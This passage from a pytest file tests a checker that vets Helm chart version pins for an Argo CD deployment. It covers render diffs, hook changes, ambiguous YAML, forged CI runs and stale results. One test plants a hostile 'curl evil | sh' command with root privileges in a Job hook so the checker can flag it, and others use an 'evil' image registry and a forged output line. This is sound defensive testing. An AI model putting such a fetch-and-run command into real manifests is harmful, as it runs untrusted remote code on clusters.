    sha = git(repo, "rev-parse", "HEAD")
    git(repo, "checkout", "-q", "main")
    result = run(repo, sha)
    assert result["result"] == "green", result["problems"]
    assert result["objects"] == []


# ── 4b. the head render against the base render, hooks included ─────────────
# Review [HIGH] 3: the head was only a subset of live, so a removed field, a
# changed hook and a steady object turned into a hook all went green.


def head_with(change) -> list:
    documents = head_documents()
    change(documents)
    return documents


def judged(repo: Path, head: list) -> dict:
    sha = pin_branch(repo, table_docs=head)
    return run(repo, sha, render=Render({PIN: base_documents(), TARGET: head}))


def test_a_field_removed_at_head_is_red(repo: Path) -> None:
    def drop(documents: list) -> None:
        pod = by_kind_name(documents, "Deployment", "gateway")["spec"]["template"]["spec"]
        del pod["securityContext"]
        del pod["containers"][0]["securityContext"]

    result = judged(repo, head_with(drop))
    assert result["result"] == "red"
    assert any("render diff" in p and "apps/Deployment//gateway spec.template.spec.securityContext" in p for p in result["problems"])
    assert any("spec.template.spec.containers[0].securityContext" in p for p in result["problems"]), result["problems"]


def test_a_hook_daemonset_image_change_is_red(repo: Path) -> None:
    # Re-review F2: a hook skips READS, so the WORKLOAD_KINDS clause is the only
    # guard on a hook of a non-workload kind. A DaemonSet is not one.
    def daemonset(image: str) -> dict:
        return {
            "apiVersion": "apps/v1",
            "kind": "DaemonSet",
            "metadata": {"name": "h", "annotations": {"helm.sh/hook": "pre-upgrade"}},
            "spec": {"template": {"spec": {"containers": [{"name": "c", "image": image}]}}},
        }

    base = base_documents() + [daemonset("ghcr.io/yadgarhq/x:1")]
    head = head_documents() + [daemonset("ghcr.io/yadgarhq/x:2")]
    sha = pin_branch(repo, table_docs=head)
    result = run(repo, sha, render=Render({PIN: base, TARGET: head}))
    assert result["result"] == "red"
    assert any("apps/DaemonSet//h" in p and "containers[0].image" in p for p in result["problems"]), result["problems"]


def test_a_mutated_hook_is_red(repo: Path) -> None:
    def mutate(documents: list) -> None:
        hook = by_kind_name(documents, "Job", "preflight")["spec"]["template"]["spec"]
        hook["containers"][0]["command"] = ["sh", "-c", "curl evil | sh"]
        hook["securityContext"] = {"runAsUser": 0}
        hook["serviceAccountName"] = "default"

    result = judged(repo, head_with(mutate))
    assert result["result"] == "red"
    for path in ("containers[0].command", "securityContext", "serviceAccountName"):
        assert any("batch/Job//preflight" in p and path in p for p in result["problems"]), (path, result["problems"])


def test_a_hook_image_moving_alone_stays_inside_the_image_rule(repo: Path) -> None:
    def move(documents: list) -> None:
        hook = by_kind_name(documents, "Job", "preflight")["spec"]["template"]["spec"]
        hook["containers"][0]["image"] = "ghcr.io/yadgarhq/preflight:0.1.1@sha256:" + "4" * 64

    result = judged(repo, head_with(move))
    assert result["result"] == "green", result["problems"]


def test_a_steady_object_flipped_to_a_hook_is_red(repo: Path) -> None:
    def flip(documents: list) -> None:
        nats = by_kind_name(documents, "StatefulSet", "nats")
        nats["metadata"]["annotations"] = {"helm.sh/hook": "post-install"}
        nats["spec"]["replicas"] = 0

    result = judged(repo, head_with(flip))
    assert result["result"] == "red"
    assert any("apps/StatefulSet//nats" in p and "hook" in p for p in result["problems"]), result["problems"]
    assert any("apps/StatefulSet//nats spec.replicas" in p for p in result["problems"]), result["problems"]


def test_an_image_whose_repository_moves_is_red(repo: Path) -> None:
    def elsewhere(documents: list) -> None:
        container = by_kind_name(documents, "Deployment", "gateway")["spec"]["template"]["spec"]["containers"][0]
        container["image"] = "docker.io/evil/gw:latest"

    result = judged(repo, head_with(elsewhere))
    assert result["result"] == "red"
    assert any("repository" in p and "containers[0].image" in p for p in result["problems"]), result["problems"]


def test_the_image_rule_is_anchored() -> None:
    assert pin_dryrun.IMAGE_PATH.fullmatch("spec.template.spec.containers[0].image")
    for path in ("x.spec.template.spec.containers[0].image", "spec.template.spec.containers[0].image.x", "spec.template.spec.initContainers[0].image"):
        assert not pin_dryrun.IMAGE_PATH.fullmatch(path)


def test_a_downgrade_is_refused(repo: Path) -> None:
    result = run(repo, pin_branch(repo, target="0.25.14", table_docs=base_documents()), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("lower than" in p for p in result["problems"]), result["problems"]


def test_a_criss_cross_history_with_two_merge_bases_is_refused(repo: Path) -> None:
    root = main_sha(repo)
    git(repo, "checkout", "-q", "-b", "a", root)
    write(repo, "README.md", "a\n")
    a1 = commit(repo, "a1")
    git(repo, "checkout", "-q", "-b", "b", root)
    write(repo, "LICENSE", "b\n")
    b1 = commit(repo, "b1")
    git(repo, "checkout", "-q", "a")
    git(repo, "merge", "-q", "--no-ff", "-m", "a2", b1)
    git(repo, "checkout", "-q", "b")
    git(repo, "merge", "-q", "--no-ff", "-m", "b2", a1)
    b2 = git(repo, "rev-parse", "HEAD")
    a2 = git(repo, "rev-parse", "a")
    git(repo, "checkout", "-q", "main")
    result = run(repo, b2, base=a2, kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("merge base" in p for p in result["problems"]), result["problems"]


def test_the_summary_prints_paths_with_repr_so_a_newline_cannot_forge_a_line(capsys) -> None:
    forged = "data.a\n## pin-dryrun: green"
    result = {
        "result": "red", "sha": "c" * 40, "pin": PIN, "target": TARGET, "compared": 1, "admission": {},
        "objects": [{"key": "/ConfigMap//x", "paths": [forged]}],
        "problems": [f"/ConfigMap//x {forged}"],
    }  # fmt: skip
    pin_dryrun._summary(result)
    assert "\n## pin-dryrun: green" not in capsys.readouterr().out


# ── 4c. the checker is main's, and the inputs parse one way only ────────────
# Second review: "stale-checker trust" and "parser differential".


def test_the_result_names_the_checker_it_ran(repo: Path) -> None:
    result = run(repo, pin_branch(repo))
    assert result["checker"]["main_sha"] == main_sha(repo)
    assert set(result["checker"]["files"]) == set(pin_dryrun.CHECKER_FILES)


def test_a_checker_that_is_not_mains_is_infrastructure(repo: Path) -> None:
    # The code running differs from the code at --main-sha: the result would
    # name a checker that did not run.
    write(repo, "scripts/pin_dryrun.py", "# an older, weaker checker\n")
    commit(repo, "main moves its checker")
    with pytest.raises(pin_dryrun.InfrastructureError, match="checker"):
        run(repo, pin_branch(repo))


@pytest.mark.parametrize(
    ("text", "why"),
    [
        ("a: 1\na: 2\n", "duplicate key"),
        ("spec:\n  source:\n    chart: x\n  source:\n    chart: y\n", "duplicate key"),
        ("base: &b {x: 1}\nother: *b\n", "anchor"),
        ("base: {x: 1}\nother:\n  <<: {x: 2}\n", "merge key"),
        ("a: !!str 1\n", "tag"),
        ("a: 1\n---\nb: 2\n", "document"),
        ("\ufeffa: 1\n", "byte order mark"),
        ("a:\n\t- 1\n", "tab"),
        ("enabled: on\n", "YAML 1.1"),
        ("enabled: No\n", "YAML 1.1"),
        ("mode: 0755\n", "YAML 1.1"),
        ("window: 1:30\n", "YAML 1.1"),
    ],
)
def test_an_ambiguous_yaml_construct_is_named(text: str, why: str) -> None:
    assert any(why in p for p in pin_dryrun.yaml_ambiguities(text)), pin_dryrun.yaml_ambiguities(text)


def test_the_fixture_application_and_the_real_one_are_unambiguous() -> None:
    assert pin_dryrun.yaml_ambiguities(APPLICATION.format(pin=PIN)) == []
    assert pin_dryrun.yaml_ambiguities((SCRIPTS.parent / "applications" / "yadgar.yaml").read_text()) == []


def test_a_duplicate_key_in_yadgar_yaml_is_refused_before_any_cluster_read(repo: Path) -> None:
    # PyYAML keeps the LAST `targetRevision`; a first-key-wins reader keeps the first.
    def duplicate(r: Path) -> None:
        text = (r / "applications/yadgar.yaml").read_text()
        write(r, "applications/yadgar.yaml", text.replace("    chart: yadgar\n", "    chart: yadgar\n    chart: other\n"))

    result = run(repo, pin_branch(repo, extra=duplicate), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("applications/yadgar.yaml" in p and "duplicate key" in p for p in result["problems"]), result["problems"]


@pytest.mark.parametrize("digest", ["", "sha256:abc", "f" * 64, "sha256:" + "G" * 64])
def test_a_malformed_head_chart_digest_is_refused(repo: Path, digest: str) -> None:
    """The digest moves with the tag; its value is checked live by CI's `chart-pin` job, its shape here (yaadgaar 250)."""
    result = run(repo, pin_branch(repo, extra=lambda r: write(r, "scripts/chart_pin.json", chart_pin(TARGET, digest))), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("scripts/chart_pin.json" in p and "digest" in p for p in result["problems"]), result["problems"]


def test_a_head_chart_pin_without_a_digest_is_refused(repo: Path) -> None:
    def drop(r: Path) -> None:
        write(r, "scripts/chart_pin.json", '{\n  "chart_tag": "v' + TARGET + '",\n  "platform_version": "0.2.6"\n}\n')

    result = run(repo, pin_branch(repo, extra=drop), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("scripts/chart_pin.json" in p for p in result["problems"]), result["problems"]


def test_a_duplicate_key_in_chart_pin_json_is_refused(repo: Path) -> None:
    def duplicate(r: Path) -> None:
        write(r, "scripts/chart_pin.json", chart_pin(TARGET).replace('"platform_version"', '"chart_tag": "v0.0.1",\n  "platform_version"'))

    result = run(repo, pin_branch(repo, extra=duplicate), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("scripts/chart_pin.json" in p and "duplicate key" in p for p in result["problems"]), result["problems"]


# ── 5. output, kubectl and failures ─────────────────────────────────────────


def test_the_result_holds_paths_never_values(repo: Path) -> None:
    head = head_documents()
    by_kind_name(head, "ConfigMap", "shared")["data"]["LOG_LEVEL"] = "s3cr3t-looking-value"
    sha = pin_branch(repo, table_docs=head)
    live = live_objects()
    items(live, "statefulsets.apps -n yadgar")[0]["spec"]["replicas"] = 3
    result = run(repo, sha, kubectl=Kubectl(live), render=Render({PIN: base_documents(), TARGET: head}))
    text = json.dumps(result)
    for value in ("s3cr3t-looking-value", "info", "sha256:" + "a" * 64, "sha256:" + "e" * 64, "10.96.0.42"):
        assert value not in text


def test_webhooks_and_policies_matching_the_workload_kinds_are_listed(repo: Path) -> None:
    result = run(repo, pin_branch(repo))
    assert result["admission"] == {
        "mutating": ["sidecar-injector/inject.example.org"],
        "validating": ["catch-all/everything.example.org"],
        "policies": ["replica-limit"],
    }


def test_every_kubectl_call_is_a_get_with_the_context(repo: Path) -> None:
    kubectl = Kubectl()
    run(repo, pin_branch(repo), kubectl=kubectl)
    assert kubectl.calls
    for call in kubectl.calls:
        assert call[:4] == ["kubectl", "--context", CONTEXT, "get"]
        assert call[-2:] == ["-o", "json"]
        assert not any("secret" in part.lower() for part in call)


def test_a_kubectl_failure_is_infrastructure_and_writes_nothing(repo: Path, tmp_path: Path) -> None:
    live = live_objects()
    del live["jobs.batch -n yadgar"]
    sha = pin_branch(repo)
    out = tmp_path / "out" / "result.json"
    code = pin_dryrun.main(
        ["run", "--repo", str(repo), "--main-sha", main_sha(repo), "--sha", sha, "--context", CONTEXT, "--out", str(out)],
        render=Render(),
        kube_runner=Kubectl(live),
    )
    assert code == 3
    assert not out.exists()


def test_the_cli_writes_the_result_and_exits_by_it(repo: Path, tmp_path: Path) -> None:
    out = tmp_path / "out" / "result.json"
    argv = ["run", "--repo", str(repo), "--main-sha", main_sha(repo), "--context", CONTEXT, "--out", str(out)]
    assert pin_dryrun.main([*argv, "--sha", pin_branch(repo)], render=Render(), kube_runner=Kubectl()) == 0
    written = json.loads(out.read_text())
    assert written["result"] == "green" and written["sha"] == git(repo, "rev-parse", "auto/pin-0.25.28")
    refused = pin_branch(repo, "scratch/ci", extra=lambda r: write(r, ".github/workflows/ci.yaml", "x: 1\n"))
    assert pin_dryrun.main([*argv, "--sha", refused], render=Render(), kube_runner=NoCluster()) == 1
    assert json.loads(out.read_text())["result"] == "refused"


def test_the_cli_refuses_a_short_sha() -> None:
    assert pin_dryrun.main(["run", "--repo", ".", "--main-sha", "abc", "--sha", "a" * 40, "--context", CONTEXT, "--out", "x"]) == 2


# ── 6. find: the reader, unforgeable and bound to the run ───────────────────

REPO = "yadgarhq/argocd-verify"
OWN_ID = 4242
PATH = ".github/workflows/pin-dryrun.yaml"
WANTED = "f" * 40
HEAD = "9" * 40
BRANCH_HEAD = "8" * 40
MAIN_SHA = "a" * 40
NOW = dt.datetime(2026, 10, 19, 10, 0, tzinfo=dt.timezone.utc)
FRESH = "2026-10-19T09:55:00Z"


def archive(result: dict) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as opened:
        opened.writestr("result.json", json.dumps(result))
    return buffer.getvalue()


class FakeGitHub:
    """Branch `main`'s head is BRANCH_HEAD. A TAG named `main` also exists: `compare/main...X` (by name)
    answers `behind` for anything, as git resolves `refs/tags/main` first. Only `compare/BRANCH_HEAD...X`
    tells the truth."""

    def __init__(self) -> None:
        self.paths: dict[str, object] = {
            f"/repos/{REPO}": {"id": OWN_ID, "default_branch": "main"},
            f"/repos/{REPO}/branches/main": {"name": "main", "commit": {"sha": BRANCH_HEAD}},
        }
        self.downloads: dict[str, bytes] = {}
        self.artifacts: list[dict] = []
        self.reachable: set[str] = {HEAD, BRANCH_HEAD}
        self.seen: list[str] = []

    def add(self, run_id: int, *, created: str, result: str = "green", sha: str = WANTED, record=None, **run_overrides) -> None:
        run = {
            "id": run_id,
            "status": "completed",
            "conclusion": "success" if result == "green" else "failure",
            "event": "workflow_dispatch",
            "head_branch": "main",
            "head_sha": BRANCH_HEAD,
            "path": PATH,
            "repository": {"id": OWN_ID},
            "head_repository": {"id": OWN_ID},
        }
        run.update(run_overrides)
        self.paths[f"/repos/{REPO}/actions/runs/{run_id}"] = run
        url = f"https://api.github.com/artifacts/{run_id}/zip"
        body = {"sha": sha, "result": result, "main_sha": MAIN_SHA, "checker": {"main_sha": MAIN_SHA}, "pin": PIN, "read_at": FRESH, "objects": []}
        body.update(record or {})
        self.downloads[url] = archive({k: v for k, v in body.items() if v is not None})
        self.artifacts.append(
            {
                "id": run_id * 10,
                "name": "pin-dryrun",
                "expired": False,
                "created_at": created,
                "archive_download_url": url,
                "workflow_run": {"id": run_id, "repository_id": OWN_ID, "head_repository_id": OWN_ID, "head_branch": "main", "head_sha": BRANCH_HEAD},
            }
        )

    def get(self, path: str):
        self.seen.append(path)
        if path.startswith(f"/repos/{REPO}/actions/artifacts?"):
            assert "name=pin-dryrun" in path
            return {"artifacts": self.artifacts if path.endswith("&page=1") else []}
        if path.startswith(f"/repos/{REPO}/compare/main..."):
            return {"status": "behind"}  # the tag named `main`
        if path.startswith(f"/repos/{REPO}/compare/{BRANCH_HEAD}..."):
            if path.rsplit("...", 1)[1] in self.reachable:
                return {"status": "behind"}
            raise pin_dryrun.NotFound(path)
        if path in self.paths:
            return self.paths[path]
        raise pin_dryrun.NotFound(path)

    def download(self, url: str) -> bytes:
        return self.downloads[url]


def find(github: FakeGitHub, *, main_sha: str = MAIN_SHA, pin: str = PIN, now: dt.datetime = NOW) -> dict | None:
    return pin_dryrun.find(github, REPO, PATH, WANTED, main_sha=main_sha, pin=pin, now=now)


def test_find_takes_the_newest_result_for_the_sha() -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", result="red")
    github.add(2, created="2026-10-19T09:00:00Z", result="green")
    found = find(github)
    assert found is not None and found["run_id"] == 2 and found["verdict"] == "green"


def test_find_lets_a_newer_red_win_over_an_older_green() -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", result="green")
    github.add(2, created="2026-10-19T09:00:00Z", result="red")
    assert find(github)["verdict"] == "red"


def test_find_answers_pending_while_the_newest_run_has_not_completed() -> None:
    # Review [HIGH] 1a: the red run uploaded its artifact and fails its last step later.
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", result="green")
    github.add(2, created="2026-10-19T09:00:00Z", result="red", status="in_progress", conclusion=None)
    found = find(github)
    assert found["run_id"] == 2 and found["verdict"] == "pending"


@pytest.mark.parametrize("conclusion", ["failure", "cancelled", "timed_out", None])
def test_find_never_calls_green_a_run_that_did_not_succeed(conclusion) -> None:
    # Review [HIGH] 1b.
    github = FakeGitHub()
    github.add(1, created="2026-10-19T09:00:00Z", result="green", conclusion=conclusion)
    found = find(github)
    assert found["verdict"] != "green" and "conclusion" in found["reason"]


@pytest.mark.parametrize(
    "record",
    [
        {"main_sha": None},  # a result that names no main
        {"main_sha": "b" * 40},  # judged against another main
        {"pin": "0.25.14"},  # judged against another pin
        {"read_at": None},
        {"read_at": "2026-07-21T08:00:00Z"},  # a green 90 days old
        {"read_at": "2026-10-19T08:59:59Z"},  # one second past the window
        {"read_at": "2026-10-19T11:00:00Z"},  # from the future
    ],
)
def test_find_calls_a_result_bound_to_another_main_pin_or_time_stale(record: dict) -> None:
    # Review [HIGH] 1c.
    github = FakeGitHub()
    github.add(1, created="2026-10-19T09:00:00Z", result="green", record=record)
    assert find(github)["verdict"] == "stale"


def test_the_freshness_window_is_named_and_bounded() -> None:
    assert 0 < pin_dryrun.FRESH_SECONDS <= 3600


def test_find_does_not_fall_back_to_an_older_green_behind_a_stale_newest() -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", result="green")
    github.add(2, created="2026-10-19T09:00:00Z", result="green", record={"main_sha": "b" * 40})
    assert find(github)["verdict"] == "stale"


@pytest.mark.parametrize(
    "overrides",
    [
        {"event": "push"},
        {"event": "pull_request"},
        {"event": "schedule"},
        {"path": ".github/workflows/settled.yaml"},
        {"head_branch": "feature"},
        {"head_repository": {"id": 1}},
        {"repository": {"id": 1}},
        # A TAG NAMED `main` (argocd#111 S1): head_branch reads "main", the
        # tag's copy of the workflow ran, and its head_sha is on no branch.
        {"head_sha": "7" * 40},
    ],
)
def test_find_ignores_a_forgeable_run(overrides: dict) -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", result="green", **overrides)
    assert find(github) is None


def test_find_compares_against_the_branch_head_sha_never_the_bare_name() -> None:
    # Review [MED] 2: a tag and a branch both named `main`; `compare/main...X` resolves the tag.
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", result="green", head_sha="7" * 40)
    assert find(github) is None
    assert not any("/compare/main..." in path for path in github.seen)
    assert f"/repos/{REPO}/branches/main" in github.seen


def test_find_ignores_an_expired_artifact_and_another_shas_result() -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", sha="0" * 40)
    github.add(2, created="2026-10-19T09:00:00Z")
    github.artifacts[1]["expired"] = True
    assert find(github) is None


def test_find_never_reads_commits_of_a_sha() -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z")
    find(github)
    assert not any("/commits/" in p for p in github.seen)


def test_the_find_cli_exits_0_only_on_a_fresh_green_bound_to_main(tmp_path: Path) -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T08:00:00Z", result="red")
    out = tmp_path / "found.json"
    argv = ["find", "--sha", WANTED, "--main-sha", MAIN_SHA, "--pin", PIN, "--out", str(out)]
    assert pin_dryrun.main(argv, github=github, now=NOW) == 1
    assert json.loads(out.read_text())["verdict"] == "red"
    github.add(2, created="2026-10-19T09:00:00Z", result="green")
    assert pin_dryrun.main(argv, github=github, now=NOW) == 0
    stale = ["find", "--sha", WANTED, "--main-sha", MAIN_SHA, "--pin", "0.25.14", "--out", str(out)]
    assert pin_dryrun.main(stale, github=github, now=NOW) == 1
    assert json.loads(out.read_text())["verdict"] == "stale"
    other = ["find", "--sha", "1" * 40, "--main-sha", MAIN_SHA, "--pin", PIN, "--out", str(out)]
    assert pin_dryrun.main(other, github=github, now=NOW) == 1
    assert json.loads(out.read_text()) == {"found": False}


def test_the_find_cli_requires_main_sha_and_pin(tmp_path: Path) -> None:
    assert pin_dryrun.main(["find", "--sha", WANTED, "--out", str(tmp_path / "x")], github=FakeGitHub(), now=NOW) == 2


# Second review ("stale-checker trust"): the result must name the checker it ran,
# and the workflow file that ran must be the default branch's current one.


@pytest.mark.parametrize("checker", [None, {}, {"main_sha": "b" * 40}])
def test_find_calls_a_result_from_another_checker_stale(checker) -> None:
    github = FakeGitHub()
    github.add(1, created="2026-10-19T09:00:00Z", result="green", record={"checker": checker})
    found = find(github)
    assert found["verdict"] == "stale" and "checker" in found["reason"]


def test_find_calls_a_run_of_an_older_workflow_version_stale() -> None:
    # The run's head_sha is ON the default branch (an ancestor), but the branch
    # has moved since: an older pin-dryrun.yaml produced it.
    github = FakeGitHub()
    github.add(1, created="2026-10-19T09:00:00Z", result="green", head_sha=HEAD)
    found = find(github)
    assert found["verdict"] == "stale" and "workflow" in found["reason"]


def test_find_refuses_a_result_json_with_duplicate_keys(tmp_path: Path) -> None:
    # Second review ("parser differential"): `{"result": "red", "result": "green"}`
    # reads green in Python and red in a first-key-wins parser.
    github = FakeGitHub()
    github.add(1, created="2026-10-19T09:00:00Z", result="green")
    url = github.artifacts[0]["archive_download_url"]
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as opened:
        opened.writestr("result.json", '{"sha": "%s", "result": "red", "result": "green"}' % WANTED)
    github.downloads[url] = buffer.getvalue()
    out = tmp_path / "found.json"
    argv = ["find", "--sha", WANTED, "--main-sha", MAIN_SHA, "--pin", PIN, "--out", str(out)]
    assert pin_dryrun.main(argv, github=github, now=NOW) == 3


# ── 7. the reader imports without PyYAML ────────────────────────────────────


def test_the_module_imports_without_pyyaml() -> None:
    code = "import sys; sys.modules['yaml'] = None; sys.path.insert(0, sys.argv[1]); import pin_dryrun; print('ok')"
    finished = subprocess.run([sys.executable, "-c", code, str(SCRIPTS)], capture_output=True, text=True, check=False)
    assert finished.returncode == 0, finished.stderr
    assert finished.stdout.strip() == "ok"


# ── 8. a platform move (car C10): a pure version move of the five operator files ──

OPERATORS = ("cert-manager", "envoy-gateway", "keda", "mariadb-operator", "prometheus")
PLATFORM, NEW_PLATFORM = "0.2.6", "0.2.7"
OPERATOR = """\
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: {name}
  namespace: argocd
spec:
  project: default
  source:
    repoURL: ghcr.io/yadgarhq/charts
    chart: platform
    # moves with platform_version
    targetRevision: {version}
    helm:
      valuesObject:
        operators:
          create: false
  destination:
    server: https://kubernetes.default.svc
    namespace: {name}
"""


def operator_file(name: str) -> str:
    return f"applications/{name}.yaml"


@pytest.fixture
def platform_repo(repo: Path) -> Path:
    for name in OPERATORS:
        write(repo, operator_file(name), OPERATOR.format(name=name, version=PLATFORM))
    commit(repo, "the operator Applications")
    return repo


def platform_branch(repo: Path, *, versions: dict | None = None, chart_platform: str = NEW_PLATFORM, extra=None) -> str:
    """A pin that also moves the platform: chart_pin.json's platform_version and the five operator files."""
    def move(r: Path) -> None:
        write(r, "scripts/chart_pin.json", chart_pin(TARGET).replace(PLATFORM, chart_platform))
        for name in OPERATORS:
            version = (versions or {}).get(name, NEW_PLATFORM)
            write(r, operator_file(name), OPERATOR.format(name=name, version=version))
        if extra:
            extra(r)

    return pin_branch(repo, extra=move)


def run_platform(repo: Path, sha: str, *, platform_of=None, kubectl=None) -> dict:
    cluster = verify_handover.Cluster(CONTEXT, runner=kubectl if kubectl is not None else NoCluster())
    return pin_dryrun.dry_run(
        repo, main_sha(repo), sha, cluster, render=Render(), platform_of=platform_of or (lambda target: NEW_PLATFORM)
    )


def test_a_pure_platform_move_goes_on_to_the_operator_comparison(platform_repo: Path) -> None:
    """Rewritten from C10 part 1's "held red until the operator comparator exists": the five files are allowed and
    pure, so nothing is refused, and step 9 renders every operator Application (from main's file) before any cluster
    read. `test_pin_dryrun_operators.py` holds the comparison itself."""
    rendered = []

    def render_operator(text: str, version: str) -> list:
        rendered.append((yaml.safe_load(text)["metadata"]["name"], version))
        raise pin_dryrun._load("pin_bump").Refused("stop here")

    cluster = verify_handover.Cluster(CONTEXT, runner=NoCluster())
    result = pin_dryrun.dry_run(
        platform_repo, main_sha(platform_repo), platform_branch(platform_repo), cluster, render=Render(),
        platform_of=lambda target: NEW_PLATFORM, render_operator=render_operator,
    )
    assert sorted(rendered) == sorted((name, PLATFORM) for name in OPERATORS)
    assert not any("operator comparator" in p or "outside" in p for p in result["problems"]), result["problems"]


def test_an_operator_file_with_a_values_change_is_refused(platform_repo: Path) -> None:
    def values(r: Path) -> None:
        text = OPERATOR.format(name="keda", version=NEW_PLATFORM).replace("create: false", "create: true")
        write(r, operator_file("keda"), text)

    result = run_platform(platform_repo, platform_branch(platform_repo, extra=values))
    assert result["result"] == "refused"
    assert any("applications/keda.yaml" in p and "targetRevision" in p for p in result["problems"]), result["problems"]


def test_five_operator_files_that_disagree_are_refused(platform_repo: Path) -> None:
    result = run_platform(platform_repo, platform_branch(platform_repo, versions={"keda": "0.2.8"}))
    assert result["result"] == "refused"
    assert any("applications/keda.yaml" in p for p in result["problems"]), result["problems"]


def test_operator_files_that_disagree_with_platform_version_are_refused(platform_repo: Path) -> None:
    sha = platform_branch(platform_repo, versions=dict.fromkeys(OPERATORS, "0.2.8"))
    result = run_platform(platform_repo, sha)
    assert result["result"] == "refused"
    assert any("platform_version" in p for p in result["problems"]), result["problems"]


def test_a_platform_version_that_is_not_the_target_charts_platform_is_refused(platform_repo: Path) -> None:
    result = run_platform(platform_repo, platform_branch(platform_repo), platform_of=lambda target: "0.2.9")
    assert result["result"] == "refused"
    assert any("0.2.9" in p for p in result["problems"]), result["problems"]


def test_an_operator_file_moved_without_platform_version_is_refused(platform_repo: Path) -> None:
    def one(r: Path) -> None:
        write(r, operator_file("keda"), OPERATOR.format(name="keda", version=NEW_PLATFORM))

    result = run_platform(platform_repo, pin_branch(platform_repo, extra=one))
    assert result["result"] == "refused"
    assert any("applications/keda.yaml" in p for p in result["problems"]), result["problems"]


def test_a_platform_move_that_leaves_an_operator_file_behind_is_refused(platform_repo: Path) -> None:
    sha = platform_branch(platform_repo, versions={"prometheus": PLATFORM})
    result = run_platform(platform_repo, sha)
    assert result["result"] == "refused"
    assert any("applications/prometheus.yaml" in p for p in result["problems"]), result["problems"]


def test_a_target_whose_chart_moved_platform_is_refused_when_the_operator_files_stay(repo: Path) -> None:
    """Carry-forward gap: a three-file pin to a target whose chart's `platform` is not the pinned `platform_version`
    leaves the operator Applications behind; refused before any cluster read."""
    result = run(repo, pin_branch(repo), kubectl=NoCluster(), platform_of=lambda target: "0.2.9")
    assert result["result"] == "refused"
    assert any("0.2.9" in p and "platform_version" in p for p in result["problems"]), result["problems"]


def test_an_unreadable_target_platform_refuses_a_three_file_pin(repo: Path) -> None:
    def unreadable(target: str) -> str:
        raise OSError("raw.githubusercontent.com unreachable")

    result = run(repo, pin_branch(repo), kubectl=NoCluster(), platform_of=unreadable)
    assert result["result"] == "refused"
    assert any("could not be read" in p for p in result["problems"]), result["problems"]
